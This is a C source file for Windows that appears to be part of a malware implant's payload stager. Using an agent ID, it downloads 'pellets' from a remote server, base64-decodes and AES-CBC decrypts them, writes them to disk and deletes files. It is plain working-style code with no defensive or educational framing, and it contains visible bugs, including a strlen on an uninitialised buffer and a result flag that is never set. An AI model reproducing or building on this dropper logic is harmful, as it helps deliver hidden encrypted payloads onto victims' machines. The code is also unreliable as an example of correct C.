#include "pellet_lib.h"
Ppellet_info form_pellet_info(Ppellet_info pinfo,char* agent_id, char* pellet_dir, char* bin_dir,char * bin_request) {
	if (pinfo == NULL) {
		pinfo = allocheap(sizeof(pellet_info));
		ZeroMemory(pinfo, sizeof(pellet_info));
		if(bin_request!=NULL)
			pinfo->bin_dir = allocheap(strlen(bin_dir) + strlen(agent_id) + 1 + strlen(bin_request));
		else 
			pinfo->bin_dir = allocheap(strlen(bin_dir) + strlen(agent_id) + 1);
		ZeroMemory(pinfo->bin_dir, strlen(bin_dir) + strlen(agent_id) + 1);
		pinfo->pellet_dir = allocheap(strlen(pellet_dir) + strlen(agent_id) + 1);
		ZeroMemory(pinfo->pellet_dir, strlen(pellet_dir) + strlen(agent_id) + 1);

		strcpy(pinfo->pellet_dir, agent_id);
		strcat(pinfo->pellet_dir, pellet_dir);
		strcpy(pinfo->bin_dir, agent_id);
		strcat(pinfo->bin_dir, bin_dir);

		if (bin_request != NULL) {
			strcat(pinfo->bin_dir, bin_request);

		}
		else {

		}
			
		return pinfo;
	}
	else return pinfo;
}
void free_pellet_info(Ppellet_info pinfo) {
	freeheap(pinfo->bin_dir);
	freeheap(pinfo->pellet_dir);
	freeheap(pinfo);
}

char * pellet_get_pellet(Psocket_address sock_address,char* path,PCHAR buffer_ptr,PULONG result, DWORD get_size,DWORD * written_size) {
	*result = -1;
	char* ot_buff = NULL;
	char* get_buff = NULL;
	ULONG res = 0;
	ot_buff = allocheap(SOCKET_GET_SIZE + 1);
	ZeroMemory(ot_buff, SOCKET_GET_SIZE+1);
	get_buff = allocheap(strlen(path) * sizeof(char) + SOCKET_GET_SIZE);
	ZeroMemory(get_buff, strlen(path) * sizeof(char) + SOCKET_GET_SIZE);
	res = socket_get_content_length(sock_address, path, get_buff, ot_buff, &get_size);
	if (res != 0)
		goto cleanup_get_pellet;
	ZeroMemory(get_buff, strlen(path) * sizeof(char) + SOCKET_GET_SIZE);
	ZeroMemory(ot_buff, SOCKET_GET_SIZE + 1);
	buffer_ptr = socket_download_file(sock_address, path, get_size, written_size, get_buff);
cleanup_get_pellet:
	freeheap(get_buff);
	freeheap(ot_buff);
	if (res != 0)
		return NULL;
	return buffer_ptr;

}
char* pellet_get_post_pellet(Psocket_address sock_address, char* path,char *post_buffer, PCHAR buffer_ptr, PULONG result, DWORD get_size, DWORD* written_size) {
	*result = -1;
	char* ot_buff = NULL;
	char* get_buff = NULL;
	ULONG res = 0;
	char* cont_len = allocheap(100);
	ZeroMemory(cont_len, 100);
	_itoa_str(strlen(post_buffer), cont_len);
	char* post_buff = allocheap(SOCKET_POST_SIZE + strlen(post_buff) * sizeof(char));

	buffer_ptr = socket_post_download(sock_address, path, cont_len,post_buffer, post_buff, 5000, written_size);
	
	freeheap(cont_len);
	freeheap(post_buff);
	return buffer_ptr;
}
char* pellet_xcrypt_pellet(char* pellet, char* pellet_key,DWORD * pellet_size) {
	char* temp_ptr,*xcrypt_temp1,*xcrypt_temp2,*xcrypt_temp3,*xcrypt_temp4=NULL;
	char* http_delimiter = "\r\n\r\n";
	char* pellet_delimiter = "<hr>";
	char* end_delimiter = "<br>";
	char* end_pellet = NULL;
	struct AES_ctx aes_ctx;

	temp_ptr = StrStrA(&pellet[10], http_delimiter);
	if (temp_ptr == NULL) {
		return NULL;
	}
	temp_ptr += 4;
	DWORD dwlen = b64d_size(strlen(temp_ptr) + 1);
	xcrypt_temp1 = (char*)allocheap(dwlen+10);
	ZeroMemory(xcrypt_temp1, dwlen+10);
	b64_decode((unsigned char*)temp_ptr, strlen(temp_ptr), xcrypt_temp1);
	freeheap(pellet);
	temp_ptr = NULL;
	temp_ptr = StrStrA(xcrypt_temp1, pellet_delimiter);
	if (temp_ptr == NULL) {
		freeheap(xcrypt_temp1);
		return NULL;
	}
	dwlen = strlen(xcrypt_temp1) - strlen(temp_ptr);
	xcrypt_temp2 = (char*)allocheap(dwlen+10);
	ZeroMemory(xcrypt_temp2, dwlen + 1);
	StringCchCopyA(xcrypt_temp2, dwlen, xcrypt_temp1);
	temp_ptr += strlen(pellet_delimiter)+1;
	dwlen = strlen(temp_ptr)+1;
	xcrypt_temp3 = allocheap(dwlen + 10);
	ZeroMemory(xcrypt_temp3, dwlen + 10);
	StringCchCopyA(xcrypt_temp3, dwlen, temp_ptr);
	freeheap(xcrypt_temp1);
	end_pellet = StrStrA(xcrypt_temp3, end_delimiter);
	dwlen = strlen(end_pellet);
	ZeroMemory(end_pellet, dwlen);
	dwlen = strlen(xcrypt_temp3);
	xcrypt_temp4 = hexstr_to_char(xcrypt_temp2);
	freeheap(xcrypt_temp2);
	xcrypt_temp2 = hexstr_to_char(xcrypt_temp3);
	freeheap(xcrypt_temp3);
	AES_init_ctx_iv(&aes_ctx, pellet_key, xcrypt_temp4);
	dwlen = dwlen / 2;
	AES_CBC_decrypt_buffer(&aes_ctx, xcrypt_temp2, dwlen);
	freeheap(xcrypt_temp4);
	memcpy((void*)pellet_size, (void*)& dwlen, sizeof(DWORD));

	return xcrypt_temp2;
	
	

}
enum pellet_ec pwrite_file(char* file, DWORD file_size, char* file_wr) {
	DWORD written_size = 0;
	HANDLE hfile = CreateFileA(file, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		if (GetLastError() == ERROR_SHARING_VIOLATION) {
			return pellet_ec_code_success;
		}
		
		else {
			return pellet_ec_file_write_failed;
		} 
	}
	if (!WriteFile(hfile, file_wr, file_size, &written_size, NULL)) {

		return pellet_ec_file_write_failed;
	}
	CloseHandle(hfile);
	written_size = 0;
	return pellet_ec_code_success;

}
enum pellet_ec pdelete_file(char* path) {
	if (!DeleteFile(path)) 
		return pellet_ec_file_delete_failed;
	return pellet_ec_code_success;
}
